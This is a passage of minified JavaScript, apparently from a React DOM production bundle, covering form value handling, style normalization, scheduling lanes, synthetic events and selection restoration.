if(r==="submit"||r==="reset"){n.removeAttribute("value");return}e.hasOwnProperty("value")?Um(n,e.type,t):e.hasOwnProperty("defaultValue")&&Um(n,e.type,oo(e.defaultValue)),e.checked==null&&e.defaultChecked!=null&&(n.defaultChecked=!!e.defaultChecked)}function V_(n,e,t){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var r=e.type;if(!(r!=="submit"&&r!=="reset"||e.value!==void 0&&e.value!==null))return;e=""+n._wrapperState.initialValue,t||e===n.value||(n.value=e),n.defaultValue=e}t=n.name,t!==""&&(n.name=""),n.defaultChecked=!!n._wrapperState.initialChecked,t!==""&&(n.name=t)}function Um(n,e,t){(e!=="number"||Vf(n.ownerDocument)!==n)&&(t==null?n.defaultValue=""+n._wrapperState.initialValue:n.defaultValue!==""+t&&(n.defaultValue=""+t))}var Dc=Array.isArray;function ol(n,e,t,r){if(n=n.options,e){e={};for(var i=0;i<t.length;i++)e["$"+t[i]]=!0;for(t=0;t<n.length;t++)i=e.hasOwnProperty("$"+n[t].value),n[t].selected!==i&&(n[t].selected=i),i&&r&&(n[t].defaultSelected=!0)}else{for(t=""+oo(t),e=null,i=0;i<n.length;i++){if(n[i].value===t){n[i].selected=!0,r&&(n[i].defaultSelected=!0);return}e!==null||n[i].disabled||(e=n[i])}e!==null&&(e.selected=!0)}}function jm(n,e){if(e.dangerouslySetInnerHTML!=null)throw Error(ae(91));return Kt({},e,{value:void 0,defaultValue:void 0,children:""+n._wrapperState.initialValue})}function F_(n,e){var t=e.value;if(t==null){if(t=e.children,e=e.defaultValue,t!=null){if(e!=null)throw Error(ae(92));if(Dc(t)){if(1<t.length)throw Error(ae(93));t=t[0]}e=t}e==null&&(e=""),t=e}n._wrapperState={initialValue:oo(t)}}function zS(n,e){var t=oo(e.value),r=oo(e.defaultValue);t!=null&&(t=""+t,t!==n.value&&(n.value=t),e.defaultValue==null&&n.defaultValue!==t&&(n.defaultValue=t)),r!=null&&(n.defaultValue=""+r)}function z_(n){var e=n.textContent;e===n._wrapperState.initialValue&&e!==""&&e!==null&&(n.value=e)}function WS(n){switch(n){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Vm(n,e){return n==null||n==="http://www.w3.org/1999/xhtml"?WS(e):n==="http://www.w3.org/2000/svg"&&e==="foreignObject"?"http://www.w3.org/1999/xhtml":n}var Dh,$S=function(n){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(e,t,r,i){MSApp.execUnsafeLocalFunction(function(){return n(e,t,r,i)})}:n}(function(n,e){if(n.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in n)n.innerHTML=e;else{for(Dh=Dh||document.createElement("div"),Dh.innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=Dh.firstChild;n.firstChild;)n.removeChild(n.firstChild);for(;e.firstChild;)n.appendChild(e.firstChild)}});function hu(n,e){if(e){var t=n.firstChild;if(t&&t===n.lastChild&&t.nodeType===3){t.nodeValue=e;return}}n.textContent=e}var qc={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},CR=["Webkit","ms","Moz","O"];Object.keys(qc).forEach(function(n){CR.forEach(function(e){e=e+n.charAt(0).toUpperCase()+n.substring(1),qc[e]=qc[n]})});function HS(n,e,t){return e==null||typeof e=="boolean"||e===""?"":t||typeof e!="number"||e===0||qc.hasOwnProperty(n)&&qc[n]?(""+e).trim():e+"px"}function qS(n,e){n=n.style;for(var t in e)if(e.hasOwnProperty(t)){var r=t.indexOf("--")===0,i=HS(t,e[t],r);t==="float"&&(t="cssFloat"),r?n.setProperty(t,i):n[t]=i}}var RR=Kt({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Fm(n,e){if(e){if(RR[n]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error(ae(137,n));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(ae(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(ae(61))}if(e.style!=null&&typeof e.style!="object")throw Error(ae(62))}}function zm(n,e){if(n.indexOf("-")===-1)return typeof e.is=="string";switch(n){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Wm=null;function zy(n){return n=n.target||n.srcElement||window,n.correspondingUseElement&&(n=n.correspondingUseElement),n.nodeType===3?n.parentNode:n}var $m=null,al=null,ll=null;function W_(n){if(n=Xu(n)){if(typeof $m!="function")throw Error(ae(280));var e=n.stateNode;e&&(e=Xd(e),$m(n.stateNode,n.type,e))}}function KS(n){al?ll?ll.push(n):ll=[n]:al=n}function GS(){if(al){var n=al,e=ll;if(ll=al=null,W_(n),e)for(n=0;n<e.length;n++)W_(e[n])}}function QS(n,e){return n(e)}function YS(){}var gg=!1;function ZS(n,e,t){if(gg)return n(e,t);gg=!0;try{return QS(n,e,t)}finally{gg=!1,(al!==null||ll!==null)&&(YS(),GS())}}function fu(n,e){var t=n.stateNode;if(t===null)return null;var r=Xd(t);if(r===null)return null;t=r[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(n=n.type,r=!(n==="button"||n==="input"||n==="select"||n==="textarea")),n=!r;break e;default:n=!1}if(n)return null;if(t&&typeof t!="function")throw Error(ae(231,e,typeof t));return t}var Hm=!1;if(rs)try{var Sc={};Object.defineProperty(Sc,"passive",{get:function(){Hm=!0}}),window.addEventListener("test",Sc,Sc),window.removeEventListener("test",Sc,Sc)}catch{Hm=!1}function MR(n,e,t,r,i,s,o,a,l){var u=Array.prototype.slice.call(arguments,3);try{e.apply(t,u)}catch(h){this.onError(h)}}var Kc=!1,Ff=null,zf=!1,qm=null,NR={onError:function(n){Kc=!0,Ff=n}};function PR(n,e,t,r,i,s,o,a,l){Kc=!1,Ff=null,MR.apply(NR,arguments)}function LR(n,e,t,r,i,s,o,a,l){if(PR.apply(this,arguments),Kc){if(Kc){var u=Ff;Kc=!1,Ff=null}else throw Error(ae(198));zf||(zf=!0,qm=u)}}function ha(n){var e=n,t=n;if(n.alternate)for(;e.return;)e=e.return;else{n=e;do e=n,e.flags&4098&&(t=e.return),n=e.return;while(n)}return e.tag===3?t:null}function JS(n){if(n.tag===13){var e=n.memoizedState;if(e===null&&(n=n.alternate,n!==null&&(e=n.memoizedState)),e!==null)return e.dehydrated}return null}function $_(n){if(ha(n)!==n)throw Error(ae(188))}function DR(n){var e=n.alternate;if(!e){if(e=ha(n),e===null)throw Error(ae(188));return e!==n?null:n}for(var t=n,r=e;;){var i=t.return;if(i===null)break;var s=i.alternate;if(s===null){if(r=i.return,r!==null){t=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===t)return $_(i),n;if(s===r)return $_(i),e;s=s.sibling}throw Error(ae(188))}if(t.return!==r.return)t=i,r=s;else{for(var o=!1,a=i.child;a;){if(a===t){o=!0,t=i,r=s;break}if(a===r){o=!0,r=i,t=s;break}a=a.sibling}if(!o){for(a=s.child;a;){if(a===t){o=!0,t=s,r=i;break}if(a===r){o=!0,r=s,t=i;break}a=a.sibling}if(!o)throw Error(ae(189))}}if(t.alternate!==r)throw Error(ae(190))}if(t.tag!==3)throw Error(ae(188));return t.stateNode.current===t?n:e}function XS(n){return n=DR(n),n!==null?eT(n):null}function eT(n){if(n.tag===5||n.tag===6)return n;for(n=n.child;n!==null;){var e=eT(n);if(e!==null)return e;n=n.sibling}return null}var tT=Mr.unstable_scheduleCallback,H_=Mr.unstable_cancelCallback,OR=Mr.unstable_shouldYield,BR=Mr.unstable_requestPaint,rn=Mr.unstable_now,UR=Mr.unstable_getCurrentPriorityLevel,Wy=Mr.unstable_ImmediatePriority,nT=Mr.unstable_UserBlockingPriority,Wf=Mr.unstable_NormalPriority,jR=Mr.unstable_LowPriority,rT=Mr.unstable_IdlePriority,Qd=null,Ii=null;function VR(n){if(Ii&&typeof Ii.onCommitFiberRoot=="function")try{Ii.onCommitFiberRoot(Qd,n,void 0,(n.current.flags&128)===128)}catch{}}var ai=Math.clz32?Math.clz32:WR,FR=Math.log,zR=Math.LN2;function WR(n){return n>>>=0,n===0?32:31-(FR(n)/zR|0)|0}var Oh=64,Bh=4194304;function Oc(n){switch(n&-n){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return n&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return n}}function $f(n,e){var t=n.pendingLanes;if(t===0)return 0;var r=0,i=n.suspendedLanes,s=n.pingedLanes,o=t&268435455;if(o!==0){var a=o&~i;a!==0?r=Oc(a):(s&=o,s!==0&&(r=Oc(s)))}else o=t&~i,o!==0?r=Oc(o):s!==0&&(r=Oc(s));if(r===0)return 0;if(e!==0&&e!==r&&!(e&i)&&(i=r&-r,s=e&-e,i>=s||i===16&&(s&4194240)!==0))return e;if(r&4&&(r|=t&16),e=n.entangledLanes,e!==0)for(n=n.entanglements,e&=r;0<e;)t=31-ai(e),i=1<<t,r|=n[t],e&=~i;return r}function $R(n,e){switch(n){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function HR(n,e){for(var t=n.suspendedLanes,r=n.pingedLanes,i=n.expirationTimes,s=n.pendingLanes;0<s;){var o=31-ai(s),a=1<<o,l=i[o];l===-1?(!(a&t)||a&r)&&(i[o]=$R(a,e)):l<=e&&(n.expiredLanes|=a),s&=~a}}function Km(n){return n=n.pendingLanes&-1073741825,n!==0?n:n&1073741824?1073741824:0}function iT(){var n=Oh;return Oh<<=1,!(Oh&4194240)&&(Oh=64),n}function mg(n){for(var e=[],t=0;31>t;t++)e.push(n);return e}function Zu(n,e,t){n.pendingLanes|=e,e!==536870912&&(n.suspendedLanes=0,n.pingedLanes=0),n=n.eventTimes,e=31-ai(e),n[e]=t}function qR(n,e){var t=n.pendingLanes&~e;n.pendingLanes=e,n.suspendedLanes=0,n.pingedLanes=0,n.expiredLanes&=e,n.mutableReadLanes&=e,n.entangledLanes&=e,e=n.entanglements;var r=n.eventTimes;for(n=n.expirationTimes;0<t;){var i=31-ai(t),s=1<<i;e[i]=0,r[i]=-1,n[i]=-1,t&=~s}}function $y(n,e){var t=n.entangledLanes|=e;for(n=n.entanglements;t;){var r=31-ai(t),i=1<<r;i&e|n[r]&e&&(n[r]|=e),t&=~i}}var ft=0;function sT(n){return n&=-n,1<n?4<n?n&268435455?16:536870912:4:1}var oT,Hy,aT,lT,cT,Gm=!1,Uh=[],Ws=null,$s=null,Hs=null,du=new Map,pu=new Map,Cs=[],KR="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function q_(n,e){switch(n){case"focusin":case"focusout":Ws=null;break;case"dragenter":case"dragleave":$s=null;break;case"mouseover":case"mouseout":Hs=null;break;case"pointerover":case"pointerout":du.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":pu.delete(e.pointerId)}}function Tc(n,e,t,r,i,s){return n===null||n.nativeEvent!==s?(n={blockedOn:e,domEventName:t,eventSystemFlags:r,nativeEvent:s,targetContainers:[i]},e!==null&&(e=Xu(e),e!==null&&Hy(e)),n):(n.eventSystemFlags|=r,e=n.targetContainers,i!==null&&e.indexOf(i)===-1&&e.push(i),n)}function GR(n,e,t,r,i){switch(e){case"focusin":return Ws=Tc(Ws,n,e,t,r,i),!0;case"dragenter":return $s=Tc($s,n,e,t,r,i),!0;case"mouseover":return Hs=Tc(Hs,n,e,t,r,i),!0;case"pointerover":var s=i.pointerId;return du.set(s,Tc(du.get(s)||null,n,e,t,r,i)),!0;case"gotpointercapture":return s=i.pointerId,pu.set(s,Tc(pu.get(s)||null,n,e,t,r,i)),!0}return!1}function uT(n){var e=Bo(n.target);if(e!==null){var t=ha(e);if(t!==null){if(e=t.tag,e===13){if(e=JS(t),e!==null){n.blockedOn=e,cT(n.priority,function(){aT(t)});return}}else if(e===3&&t.stateNode.current.memoizedState.isDehydrated){n.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}n.blockedOn=null}function pf(n){if(n.blockedOn!==null)return!1;for(var e=n.targetContainers;0<e.length;){var t=Qm(n.domEventName,n.eventSystemFlags,e[0],n.nativeEvent);if(t===null){t=n.nativeEvent;var r=new t.constructor(t.type,t);Wm=r,t.target.dispatchEvent(r),Wm=null}else return e=Xu(t),e!==null&&Hy(e),n.blockedOn=t,!1;e.shift()}return!0}function K_(n,e,t){pf(n)&&t.delete(e)}function QR(){Gm=!1,Ws!==null&&pf(Ws)&&(Ws=null),$s!==null&&pf($s)&&($s=null),Hs!==null&&pf(Hs)&&(Hs=null),du.forEach(K_),pu.forEach(K_)}function Ac(n,e){n.blockedOn===e&&(n.blockedOn=null,Gm||(Gm=!0,Mr.unstable_scheduleCallback(Mr.unstable_NormalPriority,QR)))}function gu(n){function e(i){return Ac(i,n)}if(0<Uh.length){Ac(Uh[0],n);for(var t=1;t<Uh.length;t++){var r=Uh[t];r.blockedOn===n&&(r.blockedOn=null)}}for(Ws!==null&&Ac(Ws,n),$s!==null&&Ac($s,n),Hs!==null&&Ac(Hs,n),du.forEach(e),pu.forEach(e),t=0;t<Cs.length;t++)r=Cs[t],r.blockedOn===n&&(r.blockedOn=null);for(;0<Cs.length&&(t=Cs[0],t.blockedOn===null);)uT(t),t.blockedOn===null&&Cs.shift()}var cl=ps.ReactCurrentBatchConfig,Hf=!0;function YR(n,e,t,r){var i=ft,s=cl.transition;cl.transition=null;try{ft=1,qy(n,e,t,r)}finally{ft=i,cl.transition=s}}function ZR(n,e,t,r){var i=ft,s=cl.transition;cl.transition=null;try{ft=4,qy(n,e,t,r)}finally{ft=i,cl.transition=s}}function qy(n,e,t,r){if(Hf){var i=Qm(n,e,t,r);if(i===null)bg(n,e,r,qf,t),q_(n,r);else if(GR(i,n,e,t,r))r.stopPropagation();else if(q_(n,r),e&4&&-1<KR.indexOf(n)){for(;i!==null;){var s=Xu(i);if(s!==null&&oT(s),s=Qm(n,e,t,r),s===null&&bg(n,e,r,qf,t),s===i)break;i=s}i!==null&&r.stopPropagation()}else bg(n,e,r,null,t)}}var qf=null;function Qm(n,e,t,r){if(qf=null,n=zy(r),n=Bo(n),n!==null)if(e=ha(n),e===null)n=null;else if(t=e.tag,t===13){if(n=JS(e),n!==null)return n;n=null}else if(t===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;n=null}else e!==n&&(n=null);return qf=n,null}function hT(n){switch(n){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(UR()){case Wy:return 1;case nT:return 4;case Wf:case jR:return 16;case rT:return 536870912;default:return 16}default:return 16}}var Ds=null,Ky=null,gf=null;function fT(){if(gf)return gf;var n,e=Ky,t=e.length,r,i="value"in Ds?Ds.value:Ds.textContent,s=i.length;for(n=0;n<t&&e[n]===i[n];n++);var o=t-n;for(r=1;r<=o&&e[t-r]===i[s-r];r++);return gf=i.slice(n,1<r?1-r:void 0)}function mf(n){var e=n.keyCode;return"charCode"in n?(n=n.charCode,n===0&&e===13&&(n=13)):n=e,n===10&&(n=13),32<=n||n===13?n:0}function jh(){return!0}function G_(){return!1}function Pr(n){function e(t,r,i,s,o){this._reactName=t,this._targetInst=i,this.type=r,this.nativeEvent=s,this.target=o,this.currentTarget=null;for(var a in n)n.hasOwnProperty(a)&&(t=n[a],this[a]=t?t(s):s[a]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?jh:G_,this.isPropagationStopped=G_,this}return Kt(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=jh)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=jh)},persist:function(){},isPersistent:jh}),e}var Hl={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(n){return n.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Gy=Pr(Hl),Ju=Kt({},Hl,{view:0,detail:0}),JR=Pr(Ju),yg,wg,bc,Yd=Kt({},Ju,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Qy,button:0,buttons:0,relatedTarget:function(n){return n.relatedTarget===void 0?n.fromElement===n.srcElement?n.toElement:n.fromElement:n.relatedTarget},movementX:function(n){return"movementX"in n?n.movementX:(n!==bc&&(bc&&n.type==="mousemove"?(yg=n.screenX-bc.screenX,wg=n.screenY-bc.screenY):wg=yg=0,bc=n),yg)},movementY:function(n){return"movementY"in n?n.movementY:wg}}),Q_=Pr(Yd),XR=Kt({},Yd,{dataTransfer:0}),eM=Pr(XR),tM=Kt({},Ju,{relatedTarget:0}),vg=Pr(tM),nM=Kt({},Hl,{animationName:0,elapsedTime:0,pseudoElement:0}),rM=Pr(nM),iM=Kt({},Hl,{clipboardData:function(n){return"clipboardData"in n?n.clipboardData:window.clipboardData}}),sM=Pr(iM),oM=Kt({},Hl,{data:0}),Y_=Pr(oM),aM={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},lM={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},cM={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function uM(n){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(n):(n=cM[n])?!!e[n]:!1}function Qy(){return uM}var hM=Kt({},Ju,{key:function(n){if(n.key){var e=aM[n.key]||n.key;if(e!=="Unidentified")return e}return n.type==="keypress"?(n=mf(n),n===13?"Enter":String.fromCharCode(n)):n.type==="keydown"||n.type==="keyup"?lM[n.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Qy,charCode:function(n){return n.type==="keypress"?mf(n):0},keyCode:function(n){return n.type==="keydown"||n.type==="keyup"?n.keyCode:0},which:function(n){return n.type==="keypress"?mf(n):n.type==="keydown"||n.type==="keyup"?n.keyCode:0}}),fM=Pr(hM),dM=Kt({},Yd,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Z_=Pr(dM),pM=Kt({},Ju,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Qy}),gM=Pr(pM),mM=Kt({},Hl,{propertyName:0,elapsedTime:0,pseudoElement:0}),yM=Pr(mM),wM=Kt({},Yd,{deltaX:function(n){return"deltaX"in n?n.deltaX:"wheelDeltaX"in n?-n.wheelDeltaX:0},deltaY:function(n){return"deltaY"in n?n.deltaY:"wheelDeltaY"in n?-n.wheelDeltaY:"wheelDelta"in n?-n.wheelDelta:0},deltaZ:0,deltaMode:0}),vM=Pr(wM),_M=[9,13,27,32],Yy=rs&&"CompositionEvent"in window,Gc=null;rs&&"documentMode"in document&&(Gc=document.documentMode);var EM=rs&&"TextEvent"in window&&!Gc,dT=rs&&(!Yy||Gc&&8<Gc&&11>=Gc),J_=String.fromCharCode(32),X_=!1;function pT(n,e){switch(n){case"keyup":return _M.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function gT(n){return n=n.detail,typeof n=="object"&&"data"in n?n.data:null}var Ha=!1;function IM(n,e){switch(n){case"compositionend":return gT(e);case"keypress":return e.which!==32?null:(X_=!0,J_);case"textInput":return n=e.data,n===J_&&X_?null:n;default:return null}}function SM(n,e){if(Ha)return n==="compositionend"||!Yy&&pT(n,e)?(n=fT(),gf=Ky=Ds=null,Ha=!1,n):null;switch(n){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return dT&&e.locale!=="ko"?null:e.data;default:return null}}var TM={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function e1(n){var e=n&&n.nodeName&&n.nodeName.toLowerCase();return e==="input"?!!TM[n.type]:e==="textarea"}function mT(n,e,t,r){KS(r),e=Kf(e,"onChange"),0<e.length&&(t=new Gy("onChange","change",null,t,r),n.push({event:t,listeners:e}))}var Qc=null,mu=null;function AM(n){xT(n,0)}function Zd(n){var e=Ga(n);if(VS(e))return n}function bM(n,e){if(n==="change")return e}var yT=!1;if(rs){var _g;if(rs){var Eg="oninput"in document;if(!Eg){var t1=document.createElement("div");t1.setAttribute("oninput","return;"),Eg=typeof t1.oninput=="function"}_g=Eg}else _g=!1;yT=_g&&(!document.documentMode||9<document.documentMode)}function n1(){Qc&&(Qc.detachEvent("onpropertychange",wT),mu=Qc=null)}function wT(n){if(n.propertyName==="value"&&Zd(mu)){var e=[];mT(e,mu,n,zy(n)),ZS(AM,e)}}function xM(n,e,t){n==="focusin"?(n1(),Qc=e,mu=t,Qc.attachEvent("onpropertychange",wT)):n==="focusout"&&n1()}function kM(n){if(n==="selectionchange"||n==="keyup"||n==="keydown")return Zd(mu)}function CM(n,e){if(n==="click")return Zd(e)}function RM(n,e){if(n==="input"||n==="change")return Zd(e)}function MM(n,e){return n===e&&(n!==0||1/n===1/e)||n!==n&&e!==e}var fi=typeof Object.is=="function"?Object.is:MM;function yu(n,e){if(fi(n,e))return!0;if(typeof n!="object"||n===null||typeof e!="object"||e===null)return!1;var t=Object.keys(n),r=Object.keys(e);if(t.length!==r.length)return!1;for(r=0;r<t.length;r++){var i=t[r];if(!Mm.call(e,i)||!fi(n[i],e[i]))return!1}return!0}function r1(n){for(;n&&n.firstChild;)n=n.firstChild;return n}function i1(n,e){var t=r1(n);n=0;for(var r;t;){if(t.nodeType===3){if(r=n+t.textContent.length,n<=e&&r>=e)return{node:t,offset:e-n};n=r}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=r1(t)}}function vT(n,e){return n&&e?n===e?!0:n&&n.nodeType===3?!1:e&&e.nodeType===3?vT(n,e.parentNode):"contains"in n?n.contains(e):n.compareDocumentPosition?!!(n.compareDocumentPosition(e)&16):!1:!1}function _T(){for(var n=window,e=Vf();e instanceof n.HTMLIFrameElement;){try{var t=typeof e.contentWindow.location.href=="string"}catch{t=!1}if(t)n=e.contentWindow;else break;e=Vf(n.document)}return e}function Zy(n){var e=n&&n.nodeName&&n.nodeName.toLowerCase();return e&&(e==="input"&&(n.type==="text"||n.type==="search"||n.type==="tel"||n.type==="url"||n.type==="password")||e==="textarea"||n.contentEditable==="true")}function NM(n){var e=_T(),t=n.focusedElem,r=n.selectionRange;if(e!==t&&t&&t.ownerDocument&&vT(t.ownerDocument.documentElement,t)){if(r!==null&&Zy(t)){if(e=r.start,n=r.end,n===void 0&&(n=e),"selectionStart"in t)t.selectionStart=e,t.selectionEnd=Math.min(n,t.value.length);else if(n=(e=t.ownerDocument||document)&&e.defaultView||window,n.getSelection){n=n.getSelection();var i=t.textContent.length,s=Math.min(r.start,i);r=r.end===void 0?s:Math.min(r.end,i),!n.extend&&s>r&&(i=r,r=s,s=i),i=i1(t,s);var o=i1(t,r);i&&o&&(n.rangeCount!==1||n.anchorNode!==i.node||n.anchorOffset!==i.offset||n.focusNode!==o.node||n.focusOffset!==o.offset)&&(e=e.createRange(),e.setStart(i.node,i.offset),n.removeAllRanges(),s>r?(n.addRange(e),n.extend(o.node,o.offset)):(e.setEnd(o.node,o.offset),n.addRange(e)))}}for(e=[],n=t;n=n.parentNode;)n.nodeType===1&&e.push({element:n,left:n.scrollLeft,top:n.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<e.length;t++)n=e[t],n.element.scrollLeft=n.left,n.element.scrollTop=n.top}}var PM=rs&&"documentMode"in document&&11>=document.documentMode,qa=null,Ym=null,Yc=null,Zm=!1;function s1(n,e,t){var r=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Zm||qa==null||qa!==Vf(r)||(r=qa,"selectionStart"in r&&Zy(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),Yc&&yu(Yc,r)||(Yc=r,r=Kf(Ym,"onSelect"),0<r.length&&(e=new Gy("onSelect","select",null,e,t),n.push({event:e,listeners:r}),e.target=qa)))}function Vh(n,e){var t={};return t[n.toLowerCase()]=e.toLowerCase(),t["Webkit"+n]="webkit"+e,t["Moz"+n]="moz"+e,t}var Ka={animationend:Vh("Animation","AnimationEnd"),animationiteration:Vh("Animation","AnimationIteration"),animationstart:Vh("Animation","AnimationStart"),transitionend:Vh("Transition","TransitionEnd")},Ig={},ET={};rs&&(ET=document.createElement("div").style,"AnimationEvent"in window||(delete Ka.animationend.animation,delete Ka.animationiteration.animation,delete Ka.animationstart.animation),"TransitionEvent"in window||delete Ka.transitionend.transition);function Jd(n){if(Ig[n])return Ig[n];if(!Ka[n])return n;var e=Ka[n],t;for(t in e)if(e.hasOwnProperty(t)&&t in ET)return Ig[n]=e[t];return n}var IT=Jd("animationend"),ST=Jd("animationiteration"),TT=Jd("animationstart"),AT=Jd("transitionend"),bT=new Map,o1="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function go(n,e){bT.set(n,e),ua(e,[n])}for(var Sg=0;Sg<o1.length;Sg++){var 